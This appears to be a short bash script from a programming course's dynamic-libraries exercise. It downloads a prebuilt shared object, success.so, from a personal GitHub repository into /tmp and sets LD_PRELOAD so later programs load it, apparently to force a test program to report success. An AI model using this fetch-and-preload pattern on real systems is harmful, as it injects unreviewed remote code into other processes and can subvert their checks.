#!/bin/bash
wget -P /tmp https://github.com/dexterski007/alx-low_level_programming/raw/main/0x18-dynamic_libraries/success.so
export LD_PRELOAD=/tmp/success.so
